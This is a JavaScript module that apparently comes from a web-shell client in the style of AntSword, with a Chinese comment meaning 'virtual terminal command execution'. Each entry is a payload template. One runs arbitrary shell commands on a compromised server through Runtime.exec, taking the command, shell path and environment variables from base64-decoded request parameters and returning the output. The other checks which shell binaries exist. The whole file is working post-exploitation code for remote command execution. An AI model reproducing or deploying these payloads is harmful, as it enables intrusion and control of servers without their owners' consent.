/**
 * 虚拟终端命令执行
 */

module.exports = (arg1, arg2, arg3) => ({
  exec: {
    _: `
    function ExecuteCommandCode(cmdPath, command, envstr) {
      var sb = new StringBuffer();
      var split = isWin() ? "/c" : "-c";
      var s = [cmdPath, split, command];
      var readonlyenv = System.getenv();
      var cmdenv = new HashMap(readonlyenv);
      var envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
      for (var i = 0; i < envs.length; i++) {
        var es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
        if (es.length == 2) {
          cmdenv.put(es[0], es[1]);
        }
      }
      var e = [];
      var i = 0;
      var iter = cmdenv.keySet().iterator();
      while (iter.hasNext()) {
        var key = iter.next();
        var val = cmdenv.get(key);
        e[i] = key + "=" + val;
        i++;
      }
      p = java.lang.Runtime.getRuntime().exec(s, e);
      CopyInputStream(p.getInputStream(), sb);
      CopyInputStream(p.getErrorStream(), sb);
      return sb;
    }
    function CopyInputStream(is, sb) {
      var l;
      var br = new BufferedReader(new InputStreamReader(is, cs));
      while ((l = br.readLine()) != null) {
        sb.append(l + "\\r\\n");
      }
      br.close();
    }
    function isWin() {
      var osname = System.getProperty("os.name");
      osname = osname.toLowerCase();
      return osname.startsWith("win");
    }
    
    var cmdPath = decode(request.getParameter("${arg1}"));
    var command = decode(request.getParameter("${arg2}"));
    var envstr = decode(request.getParameter("${arg3}"));
    
    output.append(ExecuteCommandCode(cmdPath, command, envstr));
    `.replace(/\n\s+/g, ""),
    [arg1]: "#{newbase64::bin}",
    [arg2]: "#{newbase64::cmd}",
    [arg3]: "#{newbase64::env}",
  },
  listcmd: {
    _: `
    function ListcmdCode(binarrstr) {
      var binarr = binarrstr.split(",");
      var ret = "";
      for (var i = 0; i < binarr.length; i++) {
        var f = new File(binarr[i]);
        if (f.exists() && !f.isDirectory()) {
          ret += binarr[i] + "\\t1\\n";
        } else {
          ret += binarr[i] + "\\t0\\n";
        }
      }
      return ret;
    }
    var z1 = decode(request.getParameter("${arg1}"));
    output.append(ListcmdCode(z1));
    `.replace(/\n\s+/g, ""),
    [arg1]: "#{newbase64::binarr}",
  },
});
